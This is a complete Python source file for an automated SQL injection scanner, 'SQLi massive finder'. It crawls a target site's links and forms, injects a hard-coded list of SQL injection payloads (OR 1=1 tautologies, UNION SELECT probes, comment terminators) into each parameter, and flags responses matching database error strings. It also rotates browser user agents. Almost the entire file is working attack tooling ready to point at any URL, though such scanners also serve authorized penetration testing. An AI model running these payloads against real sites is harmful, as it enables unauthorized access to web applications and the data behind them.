#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# SQLi massive finder
# Search for SQLi Vulnerabilities
# belane 2016

import re
from bs4 import BeautifulSoup  # pip3 install beautifulsoup4
from random import randint
from time import sleep
import urllib.request  # pip3 install urllib
import urllib.error
from urllib.parse import urlparse, parse_qs, urlencode, quote
import argparse
from sys import stdout

## DEFAULTS
INJECT_HERE = "_INJECT_HERE_"  # String to place on injection. Internal use.
DEFAULT_SCOPE = 0  # Search on the same domain. Default 0
TEST_LEVEL = 1  # Permutation on parameters use, Levels. 0,1,2
EMPTY_VAL = "1"  # Value to feed empty form fields. Use with TEST LEVEL > 0
SLEEPTIME = 0.02  # time to wait between connections.
END_ON_SQLI = "yes"  # End of Success
VERBOSE = 0  # Verbose display

useragentList = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0 Safari/537.36 Edge/13.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36']

sqliMagic = [
    "\'",
    "\' OR 1=",
    "1\' OR \'1\' = \'1\'",
    "%27 OR 1=1 --",
    "%\' OR \'0\'=\'0",
    "\'/**/OR/**/\'1\'=\'1",
    "%27",
    "%\' OR 0=0 UNION SELECT null,version(),1 #",
    "\' OR 0=0 UNION SELECT null,@@version,1 --",
    "\'DESC limit 1 %23",
    "2%0A or 1=1",
    "1 ORDER BY 99; --",
    "\'1 having 1=2",
    "1\' OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1\'",
    "1\' OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1\'",
    "1\' OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1\'",
    "1\' OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1,1\'",
    "1\' OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1,1,1\'",
    "1\' OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1,1,1,1\'",
    "1\' OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1,1,1,1,1\'",
    "1\' OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1,1,1,1,1,1\'",
    "1\' OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1,1,1,1,1,1,1\'",
    "1\' OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1,1,1,1,1,1,1,1\'",
    "1 OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1",
    "1 OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1",
    "1 OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1",
    "1 OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1,1",
    "1 OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1,1,1",
    "1 OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1,1,1,1",
    "1 OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1,1,1,1,1",
    "1 OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1,1,1,1,1,1",
    "1 OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1,1,1,1,1,1,1",
    "1 OR 0=0 UNION SELECT null,concat(char(114),char(066),char(069),char(076),char(097)),1,1,1,1,1,1,1,1,1,1"
]

sqliErrorsList = {
    'MiscError': 'SQL Error',
    'Query statements': 'SELECT statements',
    'SQL content injection': 'rBELa',
    'SQL content error': 'ERROR NO SPACE',
    'MySQL': 'error in your SQL syntax',
    'SQLite': 'Error: HY000',
    'Oracle': 'ORA-01756',
    'JDBC_CFM': 'Error Executing Database Query',
    'JDBC_CFM2': 'SQLServer JDBC Driver',
    'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
    'MSSQL_Uqm': 'Unclosed quotation mark',
    'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
    'MS-Access_JETdb': 'Microsoft JET Database'}


def checkSQLVulns(response):
    for errorType, errorMsg in sqliErrorsList.items():
        if re.search(errorMsg, response):
            return errorType
    return 0


def getCookie(url, userAgent):
    try:
        page = getPage(url, {'User-Agent': userAgent, 'Connection': 'keep-alive'}, '')
        Cookie = page.getheader('Set-Cookie')
        return Cookie
    except:
        return -1


def getPage(url, header, post):
    try:
        if post:
            req = urllib.request.Request(url, data=post, headers=header)
        else:
            req = urllib.request.Request(url, headers=header)
        Page = urllib.request.urlopen(req)
        return Page
    except urllib.error.URLError as e:
        if hasattr(e, 'reason'):
            if VERBOSE > 0: print("[!] \t\t", "URL ERROR - Reason:", e.reason)
            Page = e
        elif hasattr(e, 'code'):
            if VERBOSE > 0: print("[!] \t\t", "HTTP ERROR - Error code:", e.code)
            Page = e
        return (Page)
    except Exception:
        print("[!] ", "ERROR:", str(Exception))
        return Exception


def setScope(url):
    Root = urlparse(url).netloc.split(".")
    Path = urlparse(url).path.split("/")
    if re.search(".", Path[-1]):
        Path = "/".join(Path[:-1])
    else:
        Path = "/".join(Path[:])
    if len(Root) > 2:
        if len(Root[-2]) > 3:
            Root = ".".join(Root[-2:])
        else:
            Root = ".".join(Root[:])
    else:
        Root = ".".join(Root[-2:])
    if VERBOSE > 0: print("[i] ", "Set root to", Root, "and Path to", Path)
    return Root, Path


def getLinks(url, header):
    Links = []
    response = getPage(url, header, '')
    if hasattr(response, 'read'):
        page = BeautifulSoup(response.read(), "html.parser")
    else:
        return Links
    if VERBOSE > 0: print("[+] ", "Searching Links ...")
    for link in page.find_all('a', href=True):
        href_url = urlparse(link['href'])
        if (re.search("//", href_url._replace(query=None).geturl()) and re.search(root_url, href_url._replace(
                query=None).geturl())) or (not re.search("//", href_url._replace(query=None).geturl())):
            href_args = parse_qs(href_url.query)
            if (href_args.keys()):
                for key in href_args.keys():
                    testingValue = key
                    if re.search("//", href_url._replace(query=None).geturl()):
                        base_url = href_url._replace(query=None).geturl() + "?"
                    else:
                        if link['href'].startswith("/"):
                            base_url = url + href_url._replace(query=None).geturl() + "?"
                        else:
                            base_url = url + "/" + href_url._replace(query=None).geturl() + "?"
                    base_url += key + "=" + INJECT_HERE
                    if TEST_LEVEL > 1 or len(href_args) == 1:
                        if VERBOSE > 0: print("[+] \t", base_url)
                        if base_url not in Links:
                            Links.append(base_url)
                    for subkey in href_args.keys():
                        if subkey != testingValue:
                            base_url += "&" + subkey + "=" + href_args[subkey][0]
                            if VERBOSE > 0: print("[+] \t", base_url)
                            if base_url not in Links:
                                Links.append(base_url)
    return Links


def getForms(url, header):
    Forms = []
    response = getPage(url, header, '')
    if hasattr(response, 'read'):
        page = BeautifulSoup(response.read(), "html.parser")
    else:
        return -1
    if VERBOSE > 0: print("[i] ", "Searching forms ...")
    for form in page.find_all('form', action=True):
        if re.search("//", form['action']):
            action = form['action']
        else:
            if form['action'].startswith("/"):
                action = urlparse(url).scheme + "://" + root_url + form['action']
            else:
                action = urlparse(url).scheme + "://" + root_url + path_url + "/" + form['action']
        if not re.search(root_url, action) and DEFAULT_SCOPE < 1:
            if VERBOSE > 0: print("[!] ", "Out of scope: " + action)
            continue
        try:
            if form['method'].lower() == "post":
                form_values = {'POST': action}
            else:
                form_values = {'GET': action}
        except:
            form_values = {'GET': action}
        for input in form.find_all('input', attrs={'name': True}):
            try:
                form_values[input['name']] = input['value']
            except:
                form_values[input['name']] = ''
        for select in form.find_all('select', attrs={'name': True}):
            try:
                form_values[select['name']] = select['value']
            except:
                form_values[select['name']] = ''
        for button in form.find_all('button', attrs={'name': True}):
            try:
                form_values[button['name']] = button['value']
            except:
                form_values[button['name']] = ''
        for textarea in form.find_all('textarea', attrs={'name': True}):
            try:
                form_values[textarea['name']] = textarea['value']
            except:
                form_values[textarea['name']] = ''
        Forms.append(form_values)
        if VERBOSE > 0: print("[+] \t", "Found:", form_values)
    # print(Forms)
    return Forms


def getURLfromForms(formList):
    GetList = []
    PostList = []
    if formList == -1: return GetList, PostList
    if VERBOSE > 0: print("[i] ", "Processing forms ...")
    for formFields in formList:
        if 'GET' in formFields:
            if VERBOSE > 0: print("[+] ", "Type GET - Fields:", (len(formFields) - 1), "-", formFields['GET'])
            for key in formFields.keys():
                if key != 'GET':
                    testingVal = key
                    urlAttackAlone = formFields['GET'] + "?" + testingVal + "=" + INJECT_HERE
                    if VERBOSE > 0: print("[+] \t", urlAttackAlone)
                    if urlAttackAlone not in GetList:
                        GetList.append(urlAttackAlone)
                    if len(formFields) > 2 and TEST_LEVEL > 0:
                        urlAttackAll = urlAttackAlone
                        urlAttackAllTo1 = urlAttackAlone
                        for subkey in formFields.keys():
                            if subkey != 'GET' and subkey != testingVal:
                                urlAttackAll += "&" + subkey + "=" + formFields[subkey]
                        if VERBOSE > 0: print("[+] \t", urlAttackAll)
                        if urlAttackAll not in GetList:
                            GetList.append(urlAttackAll)
                        newVector = 0
                        for subkey in formFields.keys():
                            if subkey != 'GET' and subkey != testingVal:
                                if formFields[subkey]:
                                    urlAttackAllTo1 += "&" + subkey + "=" + formFields[subkey]
                                else:
                                    urlAttackAllTo1 += "&" + subkey + "=" + EMPTY_VAL
                                    newVector = 1
                        if newVector == 1:
                            if VERBOSE > 0: print("[+] \t", urlAttackAllTo1)
                            if urlAttackAllTo1 not in GetList:
                                GetList.append(urlAttackAllTo1)

        if 'POST' in formFields:
            if VERBOSE > 0: print("[i] ", "Type POST - Fields:", (len(formFields) - 1), "-", formFields['POST'])
            for key in formFields.keys():
                if key != 'POST':
                    testingVal = key
                    dataAttackAlone = {key: INJECT_HERE}
                    if VERBOSE > 0: print("[+] \t", formFields['POST'] + " ->", dataAttackAlone)
                    PostList.append(formFields['POST'])
                    PostList.append(dataAttackAlone)
                    if len(formFields) > 2 and TEST_LEVEL > 0:
                        dataAttackAll = dict(dataAttackAlone)
                        dataAttackAllTo1 = dict(dataAttackAlone)
                        for subkey in formFields.keys():
                            if subkey != 'POST' and subkey != testingVal:
                                dataAttackAll[subkey] = formFields[subkey]
                        if VERBOSE > 0: print("[+] \t", formFields['POST'] + " ->", dataAttackAll)
                        PostList.append(formFields['POST'])
                        PostList.append(dataAttackAll)
                        newVector = 0
                        for subkey in formFields.keys():
                            if subkey != 'POST' and subkey != testingVal:
                                if formFields[subkey]:
                                    dataAttackAllTo1[subkey] = formFields[subkey]
                                else:
                                    dataAttackAllTo1[subkey] = EMPTY_VAL
                                    newVector = 1
                        if newVector == 1:
                            if VERBOSE > 0: print("[+] \t", formFields['POST'] + " ->", dataAttackAllTo1)
                            PostList.append(formFields['POST'])
                            PostList.append(dataAttackAllTo1)
    # print(PostList)
    # print(GetList)
    return GetList, PostList


# MAIN
if __name__ == "__main__":
    ## HELP & ARGS
    parser = argparse.ArgumentParser(description='SQLi massive finder. Search for SQLi in every url and form')
    parser.add_argument('-u', '--url', type=str, required=True, help='Target URL')
    parser.add_argument('--cookie', type=str, metavar="", help='Provide a specific cookie')
    parser.add_argument('--agent', type=str, metavar="", help='Provide a specific User Agent')
    parser.add_argument('--level', type=int, metavar="0-2", help='Define test level')
    parser.add_argument('--scope', type=int, metavar="0-1", help='Define scope')
    parser.add_argument('-v', '--verbose', help='Verbose output', action="store_true")
    parser.add_argument('--endonsqli', type=str, metavar="yes|no", help='Finish the scan when first sqli found. Default "yes"')
    parser.add_argument('--sleeptime', type=float, metavar="float", help='Seconds to sleep between connections')
    parser.add_argument('--empty_val', type=str, metavar="string", help='Value to field empty parameters. Default "1"')
    args = parser.parse_args()

    if args.level: TEST_LEVEL = args.level
    if args.scope: DEFAULT_SCOPE = args.scope
    if args.sleeptime: SLEEPTIME = args.sleeptime
    if args.empty_val: EMPTY_VAL = args.empty_val
    if args.endonsqli: END_ON_SQLI = args.endonsqli
    if args.verbose: VERBOSE = 1

    ## BANNER
    print('\033[95m' + """
        _/_/_/  _/_/      _/_/_/    _/_/_/    _/_/_/      _/      _/    _/_/
       _/    _/    _/  _/    _/  _/_/      _/_/      _/  _/      _/  _/_/_/_/
      _/    _/    _/  _/    _/      _/_/      _/_/  _/    _/  _/    _/
     _/    _/    _/    _/_/_/  _/_/_/    _/_/_/    _/      _/        _/_/_/      { v0.1  github.com/belane }
        """ + '\033[0m')
    url = args.url
    root_url, path_url = setScope(url)
    print("[i] ", "Scope:", root_url, path_url)

    ## USER AGENT
    if args.agent:
        userAgent = args.agent
    else:
        userAgent = useragentList[randint(0, len(useragentList) - 1)]
    print("[i] ", "Setting User Agent:", userAgent)

    ## GET COOKIE
    if args.cookie:
        cookie = args.cookie
        print("[i] ", "Set Cookie:", cookie)
    else:
        print("[i] ", "Getting Cookie... ", end='')
        stdout.flush()
        cookie = getCookie(url, userAgent)
        if cookie == -1:
            print("\n[!] ", "No Connection. Exit")
            exit()
        print("setting Cookie:", cookie)

    ## SET HEADER
    if (cookie):
        header = {'User-Agent': userAgent, 'Referer': url, 'Cookie': cookie}
    else:
        header = {'User-Agent': userAgent, 'Referer': url}
    if VERBOSE > 0: print("[+] ", "HEADER:", header)
    print("[-] ")

    ## GET ATTACK URLs
    urlLinks = getLinks(url, header)
    urlList, dataList = getURLfromForms(getForms(url, header))
    print("[ ] ")
    print("[i] ", "Found:", len(urlLinks), "LINKS,", int(len(dataList) / 2), "POST,", len(urlList), "GET")
    print("[-] ")
    if len(urlLinks) == 0 and len(urlList) == 0 and len(dataList) == 0:
        print("[!] ", "No data found. Exit")
        exit()

    ## ATTACKS
    success = False
    results = []
    ## LINK ATTACK
    if VERBOSE > 0:
        print("[i] ", "Attack links")
    else:
        print("[i] ", "Attack links", end='')
    for injection in sqliMagic:
        if success == True and END_ON_SQLI == "yes": break
        for target in urlLinks:
            if success == True and END_ON_SQLI == "yes": break
            if VERBOSE > 0:
                print("[+] \t", "\"" + target.replace(INJECT_HERE, quote(injection)) + "\"")
            else:
                print(".", end='')
                stdout.flush()
            response = getPage(target.replace(INJECT_HERE, quote(injection)), header, '')
            if hasattr(response, 'read'):
                page = response.read().decode('utf-8', errors='ignore')
            else:
                continue
            i = checkSQLVulns(page)
            if (i):
                if VERBOSE > 0:
                    print("[*] ", "Injection FOUND:", target, "Payload:", injection, "Type", i)
                else:
                    print("*", end='')
                results.append({'URL': target, 'Payload': injection, 'Type': i})
                success = True
            sleep(SLEEPTIME)

    ## POST ATTACK
    print("[-] ")
    if VERBOSE > 0:
        print("[i] ", "Attack post")
    else:
        print("[i] ", "Attack post", end='')
    for injection in sqliMagic:
        if success == True and END_ON_SQLI == "yes": break
        for target in range(0, len(dataList), 2):
            if success == True and END_ON_SQLI == "yes": break
            dataattack = dict(dataList[target + 1])
            for key in dataattack.keys():
                if dataattack[key] == INJECT_HERE:
                    dataattack[key] = injection
            if VERBOSE > 0:
                print("[+] \t", "\"" + dataList[target] + "\" +", dataattack)
            else:
                print(".", end='')
                stdout.flush()
            data = urlencode(dataattack)
            data = data.encode('utf-8', errors='ignore')
            response = getPage(dataList[target], header, data)
            if hasattr(response, 'read'):
                page = response.read().decode('utf-8', errors='ignore')
            else:
                continue
            i = checkSQLVulns(page)
            if (i):
                if VERBOSE > 0:
                    print("[*] ", "Injection FOUND:", dataList[target], dataattack)
                else:
                    print("*", end='')
                results.append({'URL': dataList[target], 'Payload': injection, 'Data': dataList[target + 1], 'Type': i})
                success = True
            sleep(SLEEPTIME)

    ## GET ATTACK
    print("[-] ")
    if VERBOSE > 0:
        print("[i] ", "Attack get")
    else:
        print("[i] ", "Attack get", end='')
    for injection in sqliMagic:
        if success == True and END_ON_SQLI == "yes": break
        for target in urlList:
            if success == True and END_ON_SQLI == "yes": break
            if VERBOSE > 0:
                print("[+] \t", "\"" + target.replace(INJECT_HERE, injection) + "\"")
            else:
                print(".", end='')
                stdout.flush()
            response = getPage(target.replace(INJECT_HERE, quote(injection)), header, '')
            if hasattr(response, 'read'):
                page = response.read().decode('utf-8', errors='ignore')
            else:
                continue
            i = checkSQLVulns(page)
            if (i):
                if VERBOSE > 0:
                    print("[*] ", "Injection FOUND:", target, "Payload:", injection, "Type", i)
                else:
                    print("*", end='')
                results.append({'URL': target, 'Payload': injection, 'Type': i})
                success = True
            sleep(SLEEPTIME)

    ## RESULTS
    print("\n[-] ")
    if len(results) > 0:
        print("[i] ", len(results), "SQLi FOUND!")
        for result in range(len(results)):
            print("[*] ", "URL", results[result]['URL'])
            if 'Data' in results[result]: print("[ ] \t", "Post data", results[result]['Data'])
            print("[ ] \t", "Payload:", results[result]['Payload'])
            print("[ ] \t", "Message type:", results[result]['Type'])
    else:
        print("[i] ", "NO SQLi FOUND")
